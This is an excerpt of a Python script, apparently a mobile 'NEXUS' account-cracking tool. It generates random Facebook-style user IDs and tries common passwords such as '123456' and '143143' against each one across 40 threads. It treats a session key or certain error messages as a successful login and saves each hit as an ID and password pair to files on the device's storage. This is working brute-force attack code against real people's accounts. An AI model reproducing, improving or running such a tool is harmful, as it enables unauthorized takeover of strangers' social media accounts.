...
'\x1b[38;5;47m'/$$ /$$ /$$$$$$$ /$$ /$$ /$$ /$$ /$$$$$
'\x1b[38;5;47m'| $$$ | $$| $$_____/| $$ / $$| $$ | $$ /$$__ $$
'\x1b[38;5;47m'| $$$$| $$| $$ | $$/ $$/| $$ | $$| $$ \__/
'\x1b[38;5;47m'| $$ $$ $$| $$$$$ \ $$$$/ | $$ | $$| $$$$$$
'\x1b[38;5;47m'| $$ $$$| $$__/ >$$ $$ | $$ | $$ \____ $$
'\x1b[38;5;47m'| $$\ $$$| $$ /$$/\ $$| $$ | $$ /$$ \ $$
'\x1b[38;5;47m'| $$ \ $$| $$$$$$$$| $$ \ $$| $$$$$$/| $$$$$$/
'\x1b[38;5;47m'|__/ \__/|________/|__/ |__/ \______/ \_____""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    ...
    if ask in["1"]:
        ...
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as NEXUS :
        os.system('clear')
        print(logo)
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/NEXUS -OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NEXUS -OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NEXUS #1000FF-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
